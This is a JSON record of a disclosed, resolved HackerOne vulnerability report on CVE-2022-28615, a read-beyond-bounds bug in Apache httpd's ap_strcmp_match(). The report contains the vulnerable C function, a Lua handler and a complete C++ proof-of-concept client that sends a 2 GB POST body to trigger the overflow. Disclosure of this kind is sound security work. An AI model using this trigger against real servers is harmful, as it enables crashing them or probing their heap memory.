{
  "id": 1595281,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk1Mjgx",
  "url": "https://hackerone.com/reports/1595281",
  "title": "Read beyond bounds in ap_strcmp_match() [zhbug_httpd_47.7]",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-06-08T22:35:23.873Z",
  "submitted_at": "2022-06-08T22:35:23.942Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "tdp3kel9g",
    "url": "/tdp3kel9g",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142651Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3d1d8ba395f9a7c469e08478588f352187ce76e5cf99de3163b5294afdefb1dd",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ43X7AVE6%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T142651Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDznDy3u4j3aU1sms08KaMsM2p6nJOQrLe%2BCTfeWWCkSwIhAN48aveVhvKijHDcGElNAxLhza0KLS1LZpPsSe93o0ybKrIFCHcQAxoMMDEzNjE5Mjc0ODQ5IgwvK7%2FEh50UvTXqd%2BwqjwVxALUb2SGRm7B6YVLCblNNJeLEYMP9eIFwrJx2n6mICmSbIypS9B3yAvnt1%2BfS1D83t7Rn1VdVWYB61ugOxItGvtspBCQbXB1pAL3PJp%2B0MLQAKAmma7ose%2F1rTL8LmERwMc3DMPMz1BxbiV5ymD1yhwLenC4zB4Mi8qZbidecDuh5nIlhdqF13XV%2B6KAm8QxD1BYrGzLH5N8f1uIpHfSlVg9b3RaGqG7tXatKEc%2B0kWfbfUKqD9%2B%2FL2XfbnPwDH1S%2BUX%2FyzPVW3JjJKYXhEss2yUFN6Tq9n9CoByuvA%2FYcrxiazMFwRBj5yJetai%2FnnCY8chCHiy9HZQjOkoREByf9TIt%2FSn9%2BVx0bD6%2FffrCjAtZLSC2UpZhTy4nVEe8y1%2FIbu6x2%2FOmY2betwfiloRXuJGAbh7Y0Mzp7IdJoZ6MaFPx2YupBJcGkKwsazmjVgOGT9CCe2KX4O6FLZT%2FF04eYIAqylXx69Q0SJ4J%2Br3RqGHy%2FzI47AhETUW%2Bi4lZLQ0wDIbveIUxwP1kgMxwuVQS6N%2FiLcZe0zSnootH4Lg99WNWg1Po6rwj5rMTmspG8l6UeqsgAslqfH%2FmHKcyFo%2FGR59%2FTJAN00M3F0ALdFU2wmz%2FW16CObf08RwhGO53QGyZZudBb%2BChF%2BpPNPqSngXXSYwU2rO2N8xnjsyOSK66xMWefmZRHPT7taGtLN6EJZMVT1mD6FBLF3ox%2BOYe2XQHl%2FdMCrnAd9QUx63EfvaiCO1DfgwvG0hm%2FZWbTYdIz1nAGAFtW%2FKlljmoQkXVyuC9Qqh%2BXa4VNGPK4dkoFjWqC6MdHke4pQdrA45BsaV1miTY8BuEGuVLO6T6c%2BABWwLNbYlTCqMQboOp5OZ462crMOfdra4GOrABu16tnzpO9sY5jSfF4SRn89CN5OTZwIwBghBLVe9PUEJnt4KrBEP0pTNIIOd3sKPaeVHx4e0zt6lMfhuxqLIxMx6DGzDq96UYpkaP6lrsHHfJx8Ry2vyAV6vtzyL98gbyqNKLq%2FoUPM3Cyq8LSy5CEIjU%2FHaV%2B0M8dW2L8Uj8HH0cWoRL%2FQiBHOoEB8WaQyBZi2Ijbeu6e2CUfWR%2FeGa2O6X3Hq4au7KLmZHgx6sJOqA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e8bc14fdcaed783e71bdaca5a6c84248e587095ff419ae6ab87cc18e1a76e9af"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-28615"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-07-09T13:39:43.348Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-06-09T13:39:40.839Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Greetings. I have found a read-beyond-bounds attack against httpd that allows an attacker to search httpd's memory for strings matching an attacker-specified pattern [1]. The attack arises from an overflow in ap_strcmp_match() (server/util.c). [2] The vulnerability can be reached via an LUA program that uses r:strcmp_match() on a long-enough attacker-provided string, and possibly via other means.\n\nAttached is a POC that demonstrates the bug.\n\nThe buggy code (from trunk) is the entire function, which uses |int| instead of |apr_size_t| to index a string that can be longer than the maximum positive value of an |int|:\n```\n187: AP_DECLARE(int) ap_strcmp_match(const char *str, const char *expected)\n188: {\n189:     int x, y;\n190:\n191:     for (x = 0, y = 0; expected[y]; ++y, ++x) {\n192:         if (expected[y] == '*') {\n193:             while (expected[++y] == '*');\n194:             if (!expected[y])\n195:                 return 0;\n196:             while (str[x]) {\n197:                 int ret;\n198:                 if ((ret = ap_strcmp_match(&str[x++], &expected[y])) != 1)\n199:                     return ret;\n200:             }\n201:             return -1;\n202:         }\n203:         else if (!str[x])\n204:             return -1;\n205:         else if ((expected[y] != '?') && (str[x] != expected[y]))\n206:             return 1;\n207:     }\n208:     return (str[x] != '\\0');\n209: }\n```\nThus, the increments of |x| (and also |y|; not demonstrated here) can overflow from `0x7fffffff` (positive) to `0x80000000` et seq (negative), which causes references to |str[x]| to examine memory from `0x80000000` bytes *before* the beginning of |str| forward. The attached POC demonstrates this issue.\n\nTo use the POC:\n\n   1. Build bug_client.cpp.\n   2. Copy bug_47.7.1.lua into folder /bug47.7/bug47.7.1.lua .\n   3. Start httpd (with LUA enabled), attach a debugger to it, and set a BP on ap_strcmp_match().\n   4. Run bug_client.cpp.\n   5. When the BP fires, step to line 196. Set a conditional breakpoint on this line for when x > `0x7fffffff` and proceed (this can take a long time, so you might instead try proceeding then quickly breaking execution and checking the value of |x|, iterating until it's reasonable to set the conditional breakpoint).\n   6. When the conditional BP fires, observe that line 196 references |str-0x80000000|, as does line 198. Step several more times and watch the code march upward toward |str|. On a busy system, these locations are likely to contain heap data. On an idle system they could be inaccessible.\n\n[1] The attacker cannot retrieve that matching strings, only determine whether they exist.\n[2] The same bug also exists in ap_strcasecmp_match().\n\n```\n-------- bug47.7.1.lua ----------------------------------------------------\nfunction handle(r)\n   local s=r:requestbody()\n   local m=r.strcmp_match(s, \"*secret*\")\n   if m then\n      r:puts(\"Found a 'secret'\")\n   end\nend\n-------- bug47.7.1.lua ----------------------------------------------------\n```\n```\n-------- bug_client.cpp ----------------------------------------------------\n#define DO_BUG_47_7\n\n#undef UNICODE\n\n#define WIN32_LEAN_AND_MEAN\n#define _CRT_SECURE_NO_WARNINGS\n\n#include <windows.h>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <stdlib.h>\n#include <stdio.h>\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma warning (disable:6262)\nconstexpr char SERVER_NAME[] = \"127.0.0.1\";\n\nvoid FillBuffer(\n    const char *pInput,\n    char *pOutput,\n    size_t numOutputBytes) {\n\n    char *pEnd = pOutput + numOutputBytes;\n    size_t inlen = strlen(pInput);\n    while (pOutput < pEnd) {\n        size_t numBytes = min(inlen, static_cast <size_t> (pEnd - pOutput));\n        memcpy(pOutput, pInput, numBytes);\n        pOutput += inlen;\n    }\n}\n\nint ConnectSocket(const addrinfo* pAddrInfo, SOCKET* pSocket) {\n    int iResult;\n    *pSocket = socket(pAddrInfo->ai_family, pAddrInfo->ai_socktype, pAddrInfo->ai_protocol);\n    if (*pSocket == INVALID_SOCKET) {\n        printf(\"socket failed with error: %ld\\n\", WSAGetLastError());\n        return SOCKET_ERROR;\n    }\n\n    iResult = connect(*pSocket, pAddrInfo->ai_addr, static_cast<int>(pAddrInfo->ai_addrlen));\n    return iResult;\n}\n\nint __cdecl main(void)\n{\n    WSADATA wsaData;\n    int iResult;\n\n    SOCKET serverSocket = INVALID_SOCKET;\n\n    struct addrinfo* result = NULL;\n    struct addrinfo hints;\n\n// Initialize Winsock\n\n    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0) {\n        printf(\"WSAStartup failed with error: %d\\n\", iResult);\n        return 1;\n    }\n\n    ZeroMemory(&hints, sizeof(hints));\n    hints.ai_family = AF_INET;\n    hints.ai_socktype = SOCK_STREAM;\n    hints.ai_protocol = IPPROTO_TCP;\n//    hints.ai_flags = AI_PASSIVE;\n\n// Resolve the server's address and port\n\n    iResult = getaddrinfo(SERVER_NAME, \"80\", &hints, &result);\n    if (iResult != 0) {\n        printf(\"getaddrinfo failed with error: %d\\n\", iResult);\n        WSACleanup();\n        return 1;\n    }\n\n    iResult = ConnectSocket(result, &serverSocket);\n\n    if (iResult == SOCKET_ERROR) {\n        if (serverSocket != INVALID_SOCKET) {\n            closesocket(serverSocket);\n        }\n        freeaddrinfo(result);\n        WSACleanup();\n        return 1;\n    }\n\n#ifdef DO_BUG_47_7\n    char req1[] =\n        \"POST /bug47.7/bug47.7.1.lua HTTP/1.1\\r\\n\"\n        \"Host: 127.0.0.1\\r\\n\"\n        \"Accept: text/html\\r\\n\"\n        \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\n        \"Content-Length: 2147483648\\r\\n\"\n        \"Connection: close\\r\\n\\r\\n\";\n\n    const size_t sz = 2147483648ui64 + sizeof(req1) + 2; // for ending \\n and 0\n    char* pReq1 = new char[sz];\n    memcpy(pReq1, req1, strlen(req1));\n    memset(&pReq1[strlen(req1)], 'a', sz - strlen(req1));\n    pReq1[sz - 2] = '\\n';\n    pReq1[sz - 1] = 0;\n\n#endif\n\n    WSABUF w;\n    ULONG firstBatch = static_cast<ULONG>(min(sz,0x40000000));\n    w.buf = pReq1; w.len = firstBatch;\n    DWORD bytesSent = 0;\n\n    iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);\n    if (iResult == SOCKET_ERROR) {\n        closesocket(serverSocket);\n        freeaddrinfo(result);\n        WSACleanup();\n        return 1;\n    }\n\n    Sleep(1000);\n\n    if (firstBatch < sz) {\n        w.buf = pReq1 + firstBatch;\n        w.len = static_cast<ULONG>(sz - firstBatch);\n        iResult = WSASend(serverSocket, &w, 1, &bytesSent, 0, NULL, NULL);\n        if (iResult == SOCKET_ERROR) {\n            closesocket(serverSocket);\n            freeaddrinfo(result);\n            WSACleanup();\n            return 1;\n        }\n    }\n\n// Receive and throw away the response.\n\n    char recvBuf[65536];\n\n    iResult = recv(serverSocket, recvBuf, sizeof(recvBuf), 0);\n    closesocket(serverSocket);\n\n// The bug has been triggered. Cleanup and exit.\n\n    closesocket(serverSocket);\n    freeaddrinfo(result);\n    WSACleanup();\n\n    return 0;\n}\n-------- bug_client.cpp ---------------------------------------------------- \n```\n\n## Impact\n\nThe attacker could search ~ `0x80000000` bytes of beyond-bounds heap for the existence of a given string. In mitigation, the target httpd must be running a compatible lua program. Such a program must permit the attacker to upload or otherwise cause httpd to use an lua string that is `0x80000000` bytes long or longer, and must search for a string (that can be binary) that is useful to the attacker. This could occur if the lua program allowed the client (attacker in this case) to specify the string to be searched.",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-07-09T13:39:40.924Z",
  "allow_singular_disclosure_after": -50460430.34426989,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "zy9ard3",
    "mjustu",
    "shivammusic",
    "aasim690",
    "0xs"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 86382,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/apache/httpd",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 160229,
      "category": "team",
      "content": "low: Read beyond bounds in ap_strcmp_match() (CVE-2022-28615)\n\nApache HTTP Server 2.4.53 and earlier may crash or disclose information due to a read beyond bounds in ap_strcmp_match() when provided with an extremely large input buffer. While no code distributed with the server can be coerced into such a call, third-party modules or lua scripts that use ap_strcmp_match() may hypothetically be affected.\n\nAcknowledgements: The Apache HTTP Server project would like to thank Ronald Crane (Zippenhop LLC) for reporting this issue\n\nUpdate 2.4.54 released\t2022-06-08\nAffects\t<=2.4.53\n\nSecurity Advisory: https://httpd.apache.org/security/vulnerabilities_24.html",
      "user": {
        "id": 904892,
        "username": "kunderkoffler",
        "name": "Kayla Underkoffler",
        "bio": null,
        "cleared": false,
        "verified": false,
        "website": null,
        "location": null,
        "created_at": "2020-01-13T19:26:22.339Z",
        "url": "https://hackerone.com/kunderkoffler",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
